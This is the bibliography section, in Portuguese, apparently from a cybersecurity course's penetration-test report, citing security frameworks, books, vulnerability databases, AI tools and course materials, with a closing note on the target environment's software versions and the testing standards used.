### **Recursos Educacionais e Metodológicos:**
20. **Cybersecurity & Infrastructure Security Agency (CISA)**. *Cybersecurity Framework and Best Practices*. Disponível em: https://www.cisa.gov/. Acesso em: 30 nov. 2025.
21. **MITRE ATT&CK Framework**. *Adversarial Tactics, Techniques, and Common Knowledge*. Disponível em: https://attack.mitre.org/. Acesso em: 30 nov. 2025.
22. **NIST Cybersecurity Framework (CSF)**. *Framework for Improving Critical Infrastructure Cybersecurity v1.1*. Disponível em: https://www.nist.gov/cyberframework. Acesso em: 30 nov. 2025.
23. **SANS Institute**. *SEC542: Web App Penetration Testing and Ethical Hacking*. Disponível em: https://www.sans.org/cyber-security-courses/web-app-penetration-testing-ethical-hacking/. Acesso em: 30 nov. 2025.

### **Literatura Científica e Técnica:**
24. **STUTTARD, Dafydd; PINTO, Marcus**. *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws*. 2ª ed. Wiley, 2011.
25. **LYON, Gordon Fyodor**. *Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning*. Insecure, 2009.
26. **HOWARD, Michael; LEBLANC, David**. *Writing Secure Code*. 2ª ed. Microsoft Press, 2003.
27. **MCGRAW, Gary**. *Software Security: Building Security In*. Addison-Wesley Professional, 2006.

### **Bases de Dados de Vulnerabilidades:**
28. **National Vulnerability Database (NVD)**. *NIST Vulnerability Database*. Disponível em: https://nvd.nist.gov/. Acesso em: 30 nov. 2025.
29. **CVE - Common Vulnerabilities and Exposures**. *Publicly Known Cybersecurity Vulnerabilities Database*. Disponível em: https://cve.mitre.org/. Acesso em: 30 nov. 2025.
30. **Exploit Database**. *Offensive Security Exploit Archive*. Disponível em: https://www.exploit-db.com/. Acesso em: 30 nov. 2025.

### **Recursos de Ferramentas de Consulta (IA):**
31. **GitHub Copilot**. *AI-powered code completion e análise de vulnerabilidades*. Desenvolvido pela GitHub em parceria com OpenAI. Disponível em: https://github.com/features/copilot. Acesso em: 30 nov. 2025.
32. **OpenAI ChatGPT**. *Large Language Model para consultas técnicas e esclarecimento de conceitos em cybersecurity*. Desenvolvido pela OpenAI. Disponível em: https://openai.com/chatgpt. Acesso em: 30 nov. 2025.
33. **Google Gemini AI**. *Advanced AI Assistant para análises complexas e suporte em decisões técnicas*. Desenvolvido pelo Google DeepMind. Disponível em: https://gemini.google.com/. Acesso em: 30 nov. 2025.

### **Materiais Educacionais do Curso:**
34. **Escola Vai na Web**. *Formação em Cybersecurity - Desafio Final CTF*. Material do curso Formação em Cibersegurança. Disponível em: https://vainaweb.com.br/. Acesso em: 30 nov. 2025.
35. **KENSEI CyberSec Lab**. *Projeto Final Módulo 2 - Implementação de WAF ModSecurity*. Repositório GitHub. Disponível em: https://github.com/Kensei-CyberSec-Lab/formacao-cybersec/tree/main/modulo2-defesa-monitoramento/projeto-final. Acesso em: 30 nov. 2025.

### **Relatórios e Estudos de Caso:**
36. **GTIF/ADBA - Grupo de Trabalho de Infraestrutura e Fiscalização**. *Relatório de Teste de Invasão (Penetration Test)*. Associação de Dirigentes de Bancos no Amazonas, 2023. Disponível em: https://gtifadba.com.br/wp-content/uploads/2023/04/Relatorio-PenTest.pdf. Acesso em: 30 nov. 2025.

### **Documentação Oficial de Segurança:**
- **OWASP Web Security Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **NIST Cybersecurity Framework:** https://www.nist.gov/cyberframework
- **CIS Controls v8:** https://www.cisecurity.org/controls/
- **MITRE ATT&CK:** https://attack.mitre.org/
- **CVE Database:** https://cve.mitre.org/

**Nota:** *Todas as URLs foram verificadas em 30 de novembro de 2025. Para referências específicas de versões de software, foram utilizadas as versões identificadas no ambiente alvo: Apache 2.4.54/2.4.65, MySQL 8.0.44, PHP 7.4.33, Ubuntu 20.04.6 LTS, Kernel Linux 6.8.0-1016-aws. As metodologias de teste seguiram padrões PTES (Penetration Testing Execution Standard) e OWASP Testing Guide v4.2, com scoring de vulnerabilidades baseado em CVSS v3.1 e mapeamento para frameworks CWE, OWASP Top 10 2021, PCI DSS, ISO 27001, NIST SP 800-53, SOC 2 e LGPD.*

---


Copyright © 2025 <a href="https://www.claudiomendonca.eng.br" target="_blank">ClaudioMendonca.eng.br</a>. 
